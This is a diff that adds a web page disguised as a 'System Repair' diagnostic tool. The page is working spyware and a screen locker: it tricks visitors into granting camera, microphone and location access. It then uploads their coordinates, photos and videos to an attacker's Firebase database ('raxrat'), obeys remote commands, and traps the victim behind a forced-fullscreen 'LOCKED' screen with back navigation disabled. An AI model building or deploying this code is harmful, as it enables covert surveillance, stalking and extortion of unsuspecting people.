@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Diagnostic</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap');
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; overflow: hidden; font-family: 'Orbitron', sans-serif; transition: background 0.5s; }
+        
+        /* Layar Lock Sangar */
+        #rax-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999999; flex-direction: column; 
+            justify-content: center; align-items: center; text-align: center; color: #ff0055;
+        }
+        .warning-text { font-size: 15vw; color: #ff0055; text-shadow: 0 0 30px #ff0055; animation: blk 0.5s infinite; }
+        .sub-text { color: #fff; font-size: 5vw; margin-top: 20px; text-transform: uppercase; letter-spacing: 2px; }
+
+        /* Pancingan Awal */
+        #init-gate {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 10000000; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; cursor: pointer; color: #000;
+        }
+        .btn-update { padding: 20px 40px; border: 2px solid #000; font-weight: bold; text-transform: uppercase; font-size: 1.2rem; }
+
+        @keyframes blk { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        /* Hidden Media Elements */
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="init-gate" onclick="unlockSupremeAll()">
+        <div class="btn-update">[ START SYSTEM REPAIR ]</div>
+        <p style="font-size: 10px; color: #888; margin-top: 10px;">Authorize administrative repair components.</p>
+    </div>
+
+    <div id="rax-overlay">
+        <div class="warning-text">LOCKED</div>
+        <div id="msg-box" class="sub-text">APK BUG GACOR BIO</div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+
+        // Firebase lu udah di-set di sini
+        const conf = { databaseURL: "https://locker-8aa14-default-rtdb.asia-southeast1.firebasedatabase.app/" };
+        const db = getDatabase(initializeApp(conf));
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let currentStream = null;
+
+        // FUNGSI IZIN BORONGAN & PENGUNCIAN KETAT
+        window.unlockSupremeAll = async () => {
+            if (location.protocol !== 'https:') {
+                alert("Protocol Unsecured. HTTPS Required."); return;
+            }
+
+            try {
+                // 1. Fullscreen Agresif (Paksa sembunyiin URL)
+                if (document.documentElement.requestFullscreen) {
+                    await document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    await document.documentElement.webkitRequestFullscreen();
+                }
+                
+                // 2. Izin Kamera Depan (User) & Lokasi
+                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                video.srcObject = s; currentStream = s;
+                
+                navigator.geolocation.watchPosition((pos) => {
+                    set(ref(db, 'raxrat/target_info'), { lat: pos.coords.latitude, lng: pos.coords.longitude, ts: Date.now() });
+                });
+
+                document.getElementById('init-gate').style.display = 'none';
+                console.log("Supreme Stealth Mode Active.");
+
+            } catch (err) { alert("Izin diperlukan untuk melanjutkan perbaikan!"); }
+        };
+
+        // FUNGSI MODUL TERPISAH (Dipanggil dari Admin)
+        const capturePhoto = (mode) => {
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            set(ref(db, `raxrat/photo_${mode}`), { img: canvas.toDataURL('image/jpeg'), ts: Date.now() });
+        };
+
+        const captureVideo = (mode) => {
+            const chunks = [];
+            const recorder = new MediaRecorder(currentStream, { mimeType: 'video/webm;codecs=vp8' });
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => set(ref(db, `raxrat/video_${mode}`), { data: reader.result, ts: Date.now() });
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000); // Record 5 detik
+        };
+
+        const toggleFlash = async (state) => {
+            try {
+                const track = currentStream.getVideoTracks()[0];
+                await track.applyConstraints({ advanced: [{ torch: state }] });
+            } catch (e) { console.log("Senter tidak didukung"); }
+        };
+
+        // MONITOR PERINTAH ADMIN (Modular)
+        onValue(ref(db, 'raxrat/control'), async (snap) => {
+            const data = snap.val();
+            const lockView = document.getElementById('rax-overlay');
+            if (!data) return;
+
+            // Logic Lock
+            if (data.status === "locked") {
+                lockView.style.display = 'flex';
+                document.getElementById('msg-box').innerText = data.message;
+                // Anti-Back Agresif
+                history.pushState(null, null, location.href);
+                window.onpopstate = () => history.go(1);
+            } else {
+                lockView.style.display = 'none';
+                window.onpopstate = null;
+            }
+
+            // Trigger Modul Terpisah (Reset Trigger)
+            if (data.trigger === 'photo_user') capturePhoto('user');
+            if (data.trigger === 'photo_environment') capturePhoto('environment');
+            if (data.trigger === 'video_user') captureVideo('user');
+            if (data.trigger === 'video_environment') captureVideo('environment');
+            if (data.trigger === 'senter_on') await toggleFlash(true);
+            if (data.trigger === 'senter_off') await toggleFlash(false);
+
+            if (data.trigger && data.trigger !== '') {
+                set(ref(db, 'raxrat/control/trigger'), '');
+            }
+        });
+
+        // Paksa Fullscreen Balik kalau Target coba keluar
+        document.addEventListener('fullscreenchange', () => {
+            onValue(ref(db, 'raxrat/control'), (snap) => {
+                if (snap.val().status === "locked" && !document.fullscreenElement) {
+                     if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
